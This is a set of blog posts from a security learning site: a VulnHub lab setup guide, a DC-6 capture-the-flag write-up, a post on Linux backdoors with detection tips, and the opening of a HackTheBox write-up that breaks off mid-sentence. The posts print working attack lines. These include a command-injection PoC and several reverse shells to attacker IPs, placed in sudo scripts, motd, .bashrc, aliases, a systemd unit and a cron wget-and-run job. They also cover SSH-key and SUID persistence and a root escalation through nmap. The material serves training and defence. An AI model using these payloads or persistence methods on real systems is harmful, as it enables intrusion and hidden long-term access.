Analyzing the vulnerability, sometimes I patch it if it’s just an insecure code line. Learning how the author configure the server. Building a pentest lab that consist of VulnHub machines to practice network pivoting. DFIR, and many more!  Let\u0026rsquo;s jump in!\n01. Install your virtualization software First thing first, you need a virtualization software such as VirtualBox or VMWare. Here is the links for both software:\n VirtualBox - https://www.virtualbox.org/wiki/Downloads VMWare - https://www.vmware.com/products/workstation-player.html  I personally use VirtualBox (Windows) because it\u0026rsquo;s easy to use (and of course, it\u0026rsquo;s free), but I\u0026rsquo;ll update this post if I got another license of VMWare.\n02. Download VM image / OVA Assuming that you’ve downloaded and installed a VirtualBox, now get your VulnHub machines/VM images at VulnHub’s official site: https://www.vulnhub.com/.\n For this example, I\u0026rsquo;ll be using symfonos: 2.\n03. Import the image For the image, if it\u0026rsquo;s on 7z or zip format make sure to decompress it first. In my case symfonos: 2 is on 7z format, so I have to decompress it.\nHere\u0026rsquo;s what I have after decompressing it.\n Any .ovf file should already be associated with VirtualBox, and we can just double click on that file. It\u0026rsquo;ll take us straight to the import menu.\n To do that manually, open up your VirtualBox then click on the File menu -\u0026gt; select \u0026ldquo;Import Appliance\u0026hellip;\u0026rdquo;, it will pop a new window.\n Click on the icon that I marked with a red box to browse your VM image.\n Locate your VM image and then click on the Open button.\n For now let\u0026rsquo;s leave all the settings to its default.\n Click on the Import button and wait until it completed.\n When the import is done, you will see the machine on the VM list section\n 04. Setup VM network Here is the core part, we\u0026rsquo;ll be putting the VM in an isolated network.\nOpen the VM\u0026rsquo;s settings by right click and choose \u0026ldquo;Settings\u0026rdquo;.\n Go to the Network section, and set the \u0026ldquo;Attached to\u0026rdquo; to Host-only Adapter.\n Click OK button.\nNow open the adapter configuration on the File menu \u0026ndash;\u0026gt; select \u0026ldquo;Host Network Manager\u0026hellip;\u0026rdquo;.\n In the image below, the “VirtualBox Host-Only Ethernet Adapter” will be using a network range of 192.168.2.0/24 and has DHCP server enabled which is needed by VulnHub machines to obtain IP address automatically on boot.\n 192.168.2.2 is the IP address of the virtual adapter on the host side while 192.168.2.1 is the IP address of the built-in DHCP server from VirtualBox.\nBelow is the configuration for the DHCP server.\n I set my Lower Address Bound to 192.168.2.100 and Upper Address Bound to 192.168.2.254, so that all machines will be assigned with an IP started from .100-254, and no one gets 192.168.2.3-99.\nCan I configure it to 10.10.10.0/24?\nYes you can!\nIf we want to create a 10.10.10.0/24 network, it\u0026rsquo;s better to create another adapter by clicking the Create menu (you don\u0026rsquo;t say) then set the adapter\u0026rsquo;s settings with\n IPv4 Address: 10.10.10.2 (Adapter on the host side) IPv4 Network Mask: 255.255.255.0   Next, configure the DHCP server to:\n Server Address: 10.10.10.1 (VirtualBox\u0026rsquo;s built-in DHCP server) Server Mask: 255.255.255.0 Lower Address Bound: 10.10.10.100 Upper Address Bound: 10.10.10.254   Then, on the VM settings (symfonos: 2), change the adapter name with the new one we created before\n Lastly, we should also configure the attacking machine, in my case it’s Kali Linux, to use the same network adapter.\n 05. Boot it! Boot your machines and we\u0026rsquo;re done!\n Happy hacking!\n","permalink":"https://fahmifj.github.io/blog/setup-vulnhub-machines/","summary":"In this post, I would like to share a quick tutorial (I guess) on how to setup a VulnHub machine in your local network. I’ll assume that you are already familiar with software installation, know what Host OS-Guest OS is, and IP address.\nWhat is VulnHub? VulnHub is a website that provides vulnerable virtual machines (VMs) for those who wants to gain a practical experience in penetration testing. It similar with Hack The Box and TryHackMe, but with VulnHub you can practice locally.","tags":["Home-lab","VirtualBox","Tutorial"],"title":"Setup VulnHub Machines"},{"content":"DC-6 starts off by enumerating usernames from a WordPress website. I\u0026rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user\u0026rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.\nSkills Learned  WordPress enumeration and plugin exploitation Exploiting sudo privileges on nmap  Tools  Nmap Arpscan WPScan BurpSuite  Reconnaissance Host Discovery - arpscan Because 192.168.2.1 and 192.168.2.2 are virtual gateway addresses, the target machine\u0026rsquo;s IP address is most likely 192.168.2.104.\n→ root@iamf «dc-6» «192.168.43.234» $ arp-scan --interface eth0 \u0026#39;192.168.2.0/24\u0026#39; | tee scans/00-arp-scan-dc6 Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.1 08:00:27:e8:e9:78 PCS Systemtechnik GmbH 192.168.2.2 0a:00:27:00:00:07 (Unknown: locally administered) 192.168.2.104 08:00:27:ac:db:5f PCS Systemtechnik GmbH Nmap With initial scan, nmap shows two ports open: SSH on port 22 and Apache Web Server on port 80.\n→ root@iamf «dc-6» «192.168.43.234» $ nmap -n -sC -sV -oA scans/10-initial-dc6 \u0026#39;192.168.2.104\u0026#39; -v PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA) | 256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA) |_ 256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to http://wordy/ |_https-redirect: ERROR: Script execution failed (use -d to debug) MAC Address: 08:00:27:AC:DB:5F (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second From the results above, there\u0026rsquo;s a redirection to http://wordy/ on port 80. To properly resolve the web, I\u0026rsquo;ll add wordy to my /etc/hosts file.\n192.168.1.104 wordy Enumeration TCP 80 - Website This page clearly states that it\u0026rsquo;s a WordPress site.\n Nothing interesting to explore, but the text secure plugins seems to be a hint from the machine\u0026rsquo;s author.\nI ran a gobuster scan but found nothing useful.\nNmap NSE nmap script scan found some usernames.\n→ root@iamf «dc-6» «192.168.43.234» $ nmap -p 80 --script \u0026#34;http-wordpress*\u0026#34; wordy Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-11 23:13 EDT Nmap scan report for wordy (192.168.2.104) Host is up (0.00069s latency). PORT STATE SERVICE 80/tcp open http ... | /: WordPress version: 5.1.1 ... | http-wordpress-users: | Username found: admin | Username found: graham | Username found: mark | Username found: sarah | Username found: jens |_Search stopped at ID #25. Increase the upper limit if necessary with \u0026#39;http-wordpress-users.limit\u0026#39; MAC Address: 08:00:27:AC:DB:5F (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds WPScan wpscan identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.\n→ root@iamf «dc-6» «192.168.43.234» $ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive ... [+] plainview-activity-monitor | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/ | Last Updated: 2018-08-26T15:08:00.000Z | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt | [!] The version is out of date, the latest version is 20180826 | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: Plainview Activity Monitor \u0026lt;= 20161228 - Remote Command Execution (RCE) | Fixed in: 20180826 | References: | - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15877 | - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor | - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/ | | Version: 20161228 (50% confidence) | Found By: Readme - ChangeLog Section (Aggressive Detection) | - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt [+] user-role-editor | Location: http://wordy/wp-content/plugins/user-role-editor/ | Last Updated: 2021-04-05T02:38:00.000Z | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt | [!] The version is out of date, the latest version is 4.59 | | Found By: Known Locations (Aggressive Detection) | - http://wordy/wp-content/plugins/user-role-editor/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: User Role Editor \u0026lt;= 4.24 - Privilege Escalation | Fixed in: 4.25 | References: | - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c | - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/ | | Version: 4.24 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://wordy/wp-content/plugins/user-role-editor/readme.txt ... I\u0026rsquo;m interested with the RCE one, but before that I\u0026rsquo;ll have to find creds.\nBrute-forcing passwords At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn\u0026rsquo;t know that the box\u0026rsquo;s author actually gave us a hint to create a custom wordlist from rokyou.txt.\n I\u0026rsquo;ll create new wordlist from rockyou.txt and then use it to perform a brute force using wpscan.\n→ root@iamf «dc-6» «192.168.43.234» $ cat /usr/share/wordlists/rockyou.txt | grep k01 \u0026gt; passwords.txt → root@iamf «dc-6» «192.168.43.234» $ wpscan --url http://wordy/ --usernames users --passwords passwords.txt It returns one valid credentials: mark:helpdesk10.\n Foothold Shell as www-data WP Dashboard With the credentials I obtained, I can login into the admin panel.\n Plainview Activity Monitor - RCE (CVE-2018-15877) From the previous wpscan, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from exploit-db:\n\u0026lt;html\u0026gt; \u0026lt;!-- Wordpress Plainview Activity Monitor RCE [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 \u0026amp; 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor\u0026amp;tab=activity_tools\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ip\u0026#34; value=\u0026#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;lookup\u0026#34; value=\u0026#34;Lookup\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The vulnerability comes from this IP tools feature.\n I\u0026rsquo;ll hit the lookup button and intercept the request on Burp.\nRCE can be achieved by adding a set of malicious OS commands after the command pipe |, semi colon ; (stacked command), or logical OR || at the ip section. In this case, I send a reverse shell.\nHere is with command pipe.\n And this one by stacking commands with semicolon.\n I can not find the plugin\u0026rsquo;s source code, my best guess it can be something like this.\n... $ip = $_POST[\u0026#39;ip\u0026#39;] $do_something = exec(\u0026#34;dig $ip\u0026#34;) ... Privilege Escalation Shell as graham Internal enumeration The home directory is readable by www-data.\nwww-data@dc-6:/var/www/html/wp-admin$ find /home 2\u0026gt;/dev/null find /home 2\u0026gt;/dev/null ... /home/jens/backups.sh .... /home/mark/stuff/things-to-do.txt .... I immediately checked the contents of backups.sh and things-to-do.txt.\nThe backups.sh script is writable by group devs, and I\u0026rsquo;ll note that.\nwww-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh ls -l /home/jens/backups.sh -rwxrwxr-x 1 jens devs 50 Apr 26 2019 /home/jens/backups.sh www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html And this things-to-do.txt contains graham\u0026rsquo;s credentials.\nwww-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt cat /home/mark/stuff/things-to-do.txt Things to do: - Restore full functionality for the hyperdrive (need to speak to Jens) - Buy present for Sarah\u0026#39;s farewell party - Add new user: graham - GSo7isUM1D4 - done - Apply for the OSCP course - Buy new laptop for Sarah\u0026#39;s replacement SSH - graham I tried the graham\u0026rsquo;s creds, graham:GSo7isUM1D4, on SSH, and it worked.\n→ root@iamf «dc-6» «192.168.43.234» $ ssh graham@192.168.2.104 graham@192.168.2.104\u0026#39;s password: Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. graham@dc-6:~$ id uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs) Shell as jens Sudo privileges - backups.sh User graham has sudo privileges on the backups.sh script, and this allows me to run the script as user jens.\ngraham@dc-6:~$ sudo -l Matching Defaults entries for graham on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.sh graham@dc-6:~$ cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html graham@dc-6:~$ ls -l /home/jens/backups.sh -rwxrwxr-x 1 jens devs 50 Apr 26 2019 /home/jens/backups.sh Because the script is also writable by graham (devs group), I can exploit this to escalate myself to jens by adding a reverse shell line to the script and then run it with sudo.\ngraham@dc-6:~$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.108/9000 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /home/jens/backups.sh  Shell as root Sudo privileges - nmap I found out that user jens is allowed to execute nmap as root user.\njens@dc-6:/home/graham$ sudo -l sudo -l Matching Defaults entries for jens on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmap I\u0026rsquo;ll also exploit this using reference from GTFObins.\njens@dc-6:/home/graham$ TF=$(mktemp) jens@dc-6:/home/graham$ echo \u0026#39;os.execute(\u0026#34;/bin/sh\u0026#34;)\u0026#39; \u0026gt; $TF jens@dc-6:/home/graham$ sudo nmap --script=$TF  And here is the flag.\nroot@dc-6:~# cat theflag.txt Yb dP 888888 88 88 8888b. dP\u0026#34;Yb 88b 88 888888 d8b Yb db dP 88__ 88 88 8I Yb dP Yb 88Yb88 88__ Y8P YbdPYbdP 88\u0026#34;\u0026#34; 88 .o 88 .o 8I dY Yb dP 88 Y88 88\u0026#34;\u0026#34; `\u0026#34;\u0026#39; YP YP 888888 88ood8 88ood8 8888Y\u0026#34; YbodP 88 Y8 888888 (8) Congratulations!!! Hope you enjoyed DC-6. Just wanted to send a big thanks out there to all those who have provided feedback, and who have taken time to complete these little challenges. If you enjoyed this CTF, send me a tweet via @DCAU7.  References  https://www.vulnhub.com/entry/dc-6,315/ https://gtfobins.github.io/gtfobins/nmap/  ","permalink":"https://fahmifj.github.io/writeups/vulnhub/vh-dc6/","summary":"DC-6 starts off by enumerating usernames from a WordPress website. I\u0026rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user\u0026rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.","tags":["OSCP-like","Linux","WordPress","CVE-2018-15877","sudo","GTFOBins","NSE","wpscan"],"title":"VulnHub - DC-6"},{"content":"In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.\nBackdoors, what is it? What exactly is a backdoor?\nWell, I\u0026rsquo;m not going to go into as much detail as Wikipedia, but here\u0026rsquo;s:\nA backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.\nNow that we know what a backdoor is, it’s time to find out where attackers typically hide them in a Linux system. I’ll be using the Pinky’s Palace machine from VulnHub and let’s pretend it has been compromised by attackers.\n1. SSH keys When the attackers insert their public keys into one of the user\u0026rsquo;s or root\u0026rsquo;s authorized_keys file, it can be considered as a backdoor.\nFor example, below are the exploitation steps to gain root access on the target system (Pinky\u0026rsquo;s Palace).\n Of course, as an attacker, I don’t want to repeat all those exploitation steps all over again.\nSo instead, on my attacking machine, I’ll generate a new pair of SSH keys specialized for backdoor.\n And then, I can insert the newly generated public key (backdoor_ssh.pub) into the root’s or user’s authorized_keys file of the compromised system.\n# echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali\u0026#39; \u0026gt; /root/.ssh/authorized_keys Now by specifying backdoor_ssh as the identity file (private key), I’m able to gain access on the compromised system via SSH instantly.\n 2. SSH motd This is one of the cool tricks I\u0026rsquo;ve learned from HackTheBox machine called Traceback.\nMotd (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian motd can be found at /etc/update-motd.d.\nBy default, other users don\u0026rsquo;t have write permission on that directory.\n From the image above, there is only one motd script called 10-uname.\nAs an attacker, I could place a new script there as a backdoor. For example, I\u0026rsquo;ll put a netcat reverse shell script and name it as 20-backdoor inside /etc/update-motd.d/.\nroot@pinkys-palace:/etc/update-motd.d# echo -e \u0026#39;#!/bin/sh\\nnc 192.168.2.103 9001 -e /bin/bash \u0026amp;\u0026#39; \u0026gt; 20-backdoor \u0026amp;\u0026amp; chmod +x 20-backdoor Then I\u0026rsquo;ll login into the machine using a low privilege account named pinky.\n As you can see, that SSH login triggers my backdoor.\nBut wait, I logged in using pinky. How did I end up with a root shell?\nHere is the answer:\n \u0026hellip;\n​ Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at ​ each login, and this information is concatenated in /var/run/motd. The order of script ​ execution is determined by the run-parts(8) \u0026ndash;lsbsysinit option (basically alphabetical ​ order, with a few caveats).\n\u0026hellip;\n 3. User\u0026rsquo;s .bashrc - Interactive session .bashrc is one of the startup scripts used by Bourne shell aka bash. If there is a user who uses bash as their login shell, then this .bashrc will be executed for each interactive session they launch.\nHere is some actions that triggers an interactive session:\n At the image above, I inserted a non malicious line script echo \u0026quot;I'm triggered\u0026quot; to my .bashrc. But now, as an attacker, I can put a reverse shell there, and then I\u0026rsquo;ll just wait for someone to log in to trigger it.\npinky@pinkys-palace:~$ echo 'nc 192.168.2.103 9001 -e /bin/bash \u0026gt;/dev/null \u0026amp;' \u0026gt; .bashrc  In the image above, I switched from root to user pinky and put a reverse shell on pinky\u0026rsquo;s .bashrc file. I exited pinky\u0026rsquo;s shell and immediately switch again to user pinky to trigger an interactive session.\n4. User\u0026rsquo;s .bashrc - Aliases As an attacker, I can also put the backdoor in the users' aliases!\nHere is the example of a backdoored cd.\nroot@pinkys-palace:~# alias cdalias cd='$(nc 192.168.2.103 9001 -e /bin/bash\u0026amp;); cd'  Some other tricky backdoor using alias:\n https://github.com/nisay759/sudo-backdoor https://gist.github.com/ahhh/1d4bf832c5a88cc75adb  5. Cron jobs Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.\nHere is the example of a backdoor using Cron job.\nroot@pinkys-palace:~# echo \u0026#39;* * * * * root cd /tmp; wget 192.168.2.113/backdoor \u0026amp;\u0026amp; chmod +x backdoor \u0026amp;\u0026amp; ./backdoor; rm /etc/cron.d/backdoor\u0026#39; \u0026gt; /etc/cron.d/backdoor What the task above does is it will download an executable binary called \u0026lsquo;backdoor\u0026rsquo; that is hosted on my attacking machine, and the backdoor is then executed once every minute.\n 6. Backdoor as a Service (BaaS) An attacker can also create a backdoor as a service (BaaS) *I\u0026rsquo;m joking, but it\u0026rsquo;s true.\nHere is the example of BaaS typed directly in a terminal:\nroot@pinkys-palace:/etc/systemd/system# echo \u0026#39; \u0026gt; [Service] \u0026gt; Type=simple \u0026gt; User=root \u0026gt; ExecStart=/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.103/9001 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; [Install] \u0026gt; WantedBy=multi-user.target\u0026#39; \u0026gt; \u0026#39; \u0026gt; backdoor.service In a single file (backdoor.service):\n[Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.103/9001 0\u0026gt;\u0026amp;1\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; When the service is started, it launches a reverse shell to the attacker.\nroot@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service  It can be enabled on boot too.\nroot@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service 7. SUID The last one on this post is SUID.\nAs an example, I can make a copy of bash called .backdoor (notice the dot) to a low privilege user but has been compromised, and then set SUID permission on it.\n Why do I add dot?\nWell, this is based on my observation on some people out there. They tend to just use ls -l rather than ls -la, and this becomes an advantage for attackers to put a backdoor with a dot.\nIt’s not just about SUID though, it applies to other backdoors as well (*cough* and .git folder *cough*)\nBlue Team side Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), which makes it difficult to detect/find.\nAlso what I share here might not be that effective but, but here is how I usually deal with those backdoors in attack-defense CTF.\nSSH keys and .bashrc. Make sure to regularly check the all the users authorized_keys file.\nIn the image below, there is a public key with a foreign hostname kali instead of pinkys-palace, then you should suspect it.\n Well, actually, the attackers might have tricked it to look like it was a legitimate one.\nMy workaround here is why don’t we create a ‘skeleton’ file of all the authorized_keys files and set a Cronjob which automatically reverts those files back to its original state, and I might perform it remotely via scp. This can be applied as well to handle backdoor in .bashrc .\n You can find the skeleton file of .bashrc at /etc/skel.\n SSH motd It\u0026rsquo;s not always placed on /etc/update-motd.d but make sure the motd directory is only writable by root, note the default list of motd files and apply the same thing as above (skeleton file) because attackers might have inserted backdoor in the original file.\nWe could also do some \u0026lsquo;forensics\u0026rsquo; using timestamp:\nroot@MSI:/etc/update-motd.d# ls --full-time For example, those files with the timestamp 000000000 (nano) in the image below have most likely not been modified and are still in their original state.\n After inserting a non-malicious line, the timestamp changed. From here, it\u0026rsquo;s safe to assume that someone/something has modified it.\n Cronjobs and Services I think monitoring the process using netstat and ps command is enough for this. Anything that looks like a reverse shell or a bind shell is definitely suspicious.\nTo find an unwanted open port we can use this command:\nnetstat -antp | grep LISTEN To find a suspicious connection we can use this command:\nnetstat -antp | grep ESTABLISHED  Sometimes the state of a backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. That happens because the backdoor tries to send a reverse shell out but the attacker didn’t catch or fail to catch it.\nTo find that, at the grep side, we can just change ESTABLISHED or LISTEN to SYN_SENT\nnetstat -antp | grep SYN_SENT There is also the ps -f command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on .bashrc file because it gets triggered every time we launch a bash shell (interactive session).\n Finding SUID To find some suspicious SUID we can use the find commands. It can also detect the SUID that started with dot!\nroot@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2\u0026gt;/dev/null  So that\u0026rsquo;s all for today.\n References  https://www.techslang.com/definition/what-is-a-reverse-shell/ https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54 https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/ https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c https://gist.github.com/ahhh/1d4bf832c5a88cc75adb https://ippsec.rocks/?#  ","permalink":"https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/","summary":"In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.\nBackdoors, what is it? What exactly is a backdoor?\nWell, I\u0026rsquo;m not going to go into as much detail as Wikipedia, but here\u0026rsquo;s:\nA backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice.","tags":["Linux","Server","Backdoor","Security","Forensics"],"title":"Linux Backdoors and Where to Find Them"},{"content":"Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by Inti De Ceukelaire.\nOn this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I\u0026rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I\u0026rsquo;m able to crack the password and obtain root access.\nSkills Learned  TicketTrick Generating wordlist using hashcat  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux hashcat  Reconnaissance Nmap nmap full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065\n→ root@kali «delivery» «10.10.14.70» $ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT .... PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.14.2 8065/tcp open unknown syn-ack ttl 63 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\u0026#34;)%r(GetRequest,DF3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\ .... → root@kali «delivery» «10.10.14.70» $ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT Nmap scan report for 10.10.10.222 Host is up, received echo-reply ttl 63 (0.45s latency). PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http syn-ack ttl 63 |_http-title: Welcome 8065/tcp open unknown syn-ack ttl 63 I can clearly see the fingerprint of port 8065 indicate that it\u0026rsquo;s a HTTP server. I can confirm it with curl.\n→ root@kali «delivery» «10.10.14.70» $ curl -sI 10.10.10.222:8065 HTTP/1.1 405 Method Not Allowed Date: Fri, 21 May 2021 19:09:14 GMT Enumeration TCP 80 - Website This page is a static website.\n The text “HELPDESK” points to http://helpdesk.delivery.htb/ . Clicking on the \u0026ldquo;CONTACT US\u0026rdquo; flips the homepage to this views:\n The text “MatterMost server” points to http://delivery.htb:8065.\nI can use curl and grep command to grab all the links/URL from this page.\n→ root@kali «delivery» «10.10.14.70» $ curl -s 10.10.10.222 | grep -Eo \u0026#39;href=\u0026#34;[^\\\u0026#34;]+\u0026#34;\u0026#39; | grep -v \u0026#39;#\u0026#39; href=\u0026#34;assets/css/main.css\u0026#34; href=\u0026#34;assets/css/ie9.css\u0026#34; href=\u0026#34;assets/css/noscript.css\u0026#34; href=\u0026#34;http://helpdesk.delivery.htb\u0026#34; href=\u0026#34;http://helpdesk.delivery.htb\u0026#34; href=\u0026#34;http://delivery.htb:8065\u0026#34; href=\u0026#34;https://html5up.net\u0026#34; I’ll add the newly discovered hostnames to my /etc/hosts:\n→ root@kali «delivery» «10.10.14.70» $ echo \u0026#39;10.10.10.222 delivery.htb helpdesk.delivery.htb\u0026#39; \u0026gt; /etc/hosts Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.\n→ root@kali «delivery» «10.10.14.70» $ curl -s http://10.10.10.222/ | wc -c 10850 → root@kali «delivery» «10.10.14.70» $ curl -s http://delivery.htb/ | wc -c 10850 → root@kali «delivery» «10.10.14.70» $ curl -s http://helpdesk.delivery.htb/ | wc -c 4933 There is only one page that has different in size.\nI did a gobuster scan but find nothing useful in the results, so I\u0026rsquo;ll move to the next prt.\nTCP 80 - helpdesk.delivery.htb There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by osTicket.\n The \u0026ldquo;Open a New Ticket\u0026rdquo; menu.\n The 